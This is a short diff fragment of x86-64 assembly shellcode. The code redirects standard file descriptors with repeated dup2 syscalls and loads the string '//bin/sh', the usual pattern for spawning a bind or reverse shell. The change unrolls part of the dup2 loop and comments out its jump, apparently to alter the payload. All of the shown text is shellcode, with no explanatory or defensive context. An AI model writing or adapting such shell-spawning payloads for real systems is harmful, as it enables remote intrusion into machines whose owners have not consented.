@@ -102,7 +102,13 @@ loop:
         syscall
         inc rsi
         cmp rsi, 2
-        jle loop
+        mov al, 33
+        syscall
+        inc rsi
+
+
+
+        ;jle loop
 
         xor rax, rax
         mov rdi, 0x68732f6e69622f2f
